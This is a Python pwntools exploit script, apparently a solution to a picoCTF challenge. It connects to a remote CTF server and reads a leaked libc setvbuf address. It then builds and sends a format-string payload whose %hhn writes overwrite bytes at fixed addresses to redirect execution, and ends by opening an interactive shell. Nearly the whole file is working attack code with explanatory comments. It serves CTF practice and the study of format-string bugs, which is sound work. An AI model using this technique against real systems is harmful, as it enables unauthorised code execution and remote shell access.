from pwn import *
r = remote('rhea.picoctf.net',57947)
print(r.recvuntil(b'libc: '))
# receive the address of setvbuf
# setvbuf_addr=r.recvline()
setvbuf_addr = r.recvline().strip().decode()

print(setvbuf_addr)

# split out the second and third bytes (counting from right end)
"""
Converts setvbuf_addr (a hexadecimal string) into an integer.
Extracts the second byte (from right) by dividing by 256 and taking modulo 256.
Extracts the third byte (from right) by dividing by 256² and taking modulo 256.
Computes second_diff = second_byte - 0xa3 to adjust the memory write later.
"""
second_byte=(int(setvbuf_addr[:-1],16)//256)%256
print("second_byte is:" + hex(second_byte))
second_diff=second_byte-0xa3
third_byte=(int(setvbuf_addr[:-1],16)//(256*256))%256
print("third_byte is:" + hex(third_byte))

"""
Goal: Minimize the number of bytes written to memory while modifying only necessary bytes.
Why modify bytes separately? Instead of overwriting an entire address (4 or 8 bytes), 
modifying individual bytes makes it easier to control execution.
Values being written:
third_byte - 3 (modifies the third byte)
0x60 (least significant byte)
0xf7 + second_diff (second-least significant byte)
"""

# to minimize # of bytes, write third byte, then first byte, then second
# bottom bytes are 0xf760
# third byte should be value of setvbuf's third byte, minus 3
prefix="%03d"%(third_byte-3)
# second byte written is least significant
# we just want this to change to 0x60, 0x160 is used to make
# sure value is positive and extra 0x100 is removed by %256
# Since %hhn is number of bytes written so far, we subtract that
second_amount=(0x160-(third_byte-3))%256
secondfix="%03d"%second_amount
# third byte written is second-least significant
# we want this to be f7+whatever difference we discovered from setvbuf
# We know num bytes written so far is 0x60, so we subtract that
third_amount=(0x1f7-0x60+second_diff)%256
thirdfix="%03d"%third_amount

"""
Ensures the total number of bytes written is within a safe range (since printf usually has a 512-byte buffer).
"""
# printf probably uses a 512 byte buffer
print(second_amount+third_amount+third_byte-3)
if second_amount+third_amount+third_byte-3 > 512:
    print("Probably gonna fail!")

"""
Format String Explanation:
%" + prefix + "u%43$hhn" → Writes third_byte - 3 to memory at 43$
%" + secondfix + "u%45$hhn" → Writes second_amount to memory at 45$
%" + thirdfix + "u%44$hhn" → Writes third_amount to memory at 44$
The hhn format specifier writes one byte.
"""
print("%" + prefix + "u%43$hhn%"+secondfix+"u%45$hhn%"+thirdfix+"u%44$hhnYYYY")
print(len("%" + prefix + "u%43$hhn%"+secondfix+"u%45$hhn%"+thirdfix+"u%44$hhnYYYY"))

"""
The format string is sent twice with different variations (llx and hhn).
What happens?
The first payload likely leaks memory.
The second payload writes controlled values to specific memory locations.
"""
# r.sendline("%" + prefix + "u%43$llx%"+secondfix+"u%45$llx%"+thirdfix+"u%44$llxYYYY\x1a\x40\x40\x00\x00\x00\x00\x00\x19\x40\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00")
r.sendline(("%" + prefix + "u%43$llx%" + secondfix + "u%45$llx%" + thirdfix + "u%44$llxYYYY").encode() + 
           b"\x1a\x40\x40\x00\x00\x00\x00\x00\x19\x40\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00")



# r.sendline("%" + prefix + "u%43$hhn%"+secondfix+"u%45$hhn%"+thirdfix+"u%44$hhnYYYY\x1a\x40\x40\x00\x00\x00\x00\x00\x19\x40\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00")
r.sendline(("%" + prefix + "u%43$hhn%" + secondfix + "u%45$hhn%" + thirdfix + "u%44$hhnYYYY").encode() + 
           b"\x1a\x40\x40\x00\x00\x00\x00\x00\x19\x40\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00")




"""
If successful, this gives an interactive shell on the remote system.
"""
r.interactive()
